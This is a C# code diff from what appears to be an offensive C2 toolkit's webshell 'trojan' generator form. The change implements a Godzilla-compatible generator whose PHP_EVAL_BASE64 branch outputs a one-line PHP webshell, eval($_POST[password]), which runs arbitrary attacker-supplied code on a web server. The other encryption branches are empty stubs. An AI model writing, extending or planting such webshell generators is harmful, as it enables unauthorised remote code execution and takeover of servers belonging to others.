@@ -12,7 +12,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string TrojanType { get => this.trojanComboBox.Text.Trim(); }
         private string Password { get => this.passTextBox.Text.Trim(); }
         private string Key { get => this.keyTextBox.Text.Trim(); }
-        private string Encry { get => this.encryComboBox.Text.Trim(); }
+        private string EncryType { get => this.encryComboBox.Text.Trim(); }
         public TrojanGeneratorForm(string trojanType, bool encry = false)
         {
             InitializeComponent();
@@ -85,7 +85,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                     ret = GenOneWord9(Password);
                     break;
                 case "哥斯拉配套Trojan":
-                    ret = GenGodzilla(Password);
+                    ret = GenGodzilla(Password, Key, EncryType);
                     break;
                 case "三代冰蝎配套Trojan":
                     ret = GenBehinder3(Password);
@@ -131,9 +131,24 @@ namespace C2.Business.CastleBravo.WebShellTool
             return sb.ToString();
         }
 
-        private string GenGodzilla(string password)
+        private string GenGodzilla(string password, string key, string encryType)
         {
-            throw new NotImplementedException();
+            StringBuilder sb = new StringBuilder();
+            switch (encryType)
+            {
+                case "PHP_XOR_RAW":
+                    break;
+                case "PHP_XOR_BASE64":
+                    break;
+                case "PHP_EVAL_BASE64":
+                    sb.Clear();
+                    sb.AppendLine("<?php")
+                      .AppendLine(string.Format("eval($_POST[\"{0}\"]);", password));
+                    break;
+                default:
+                    break;
+            }
+            return sb.ToString();
         }
 
         private string GenCaesar(string password)
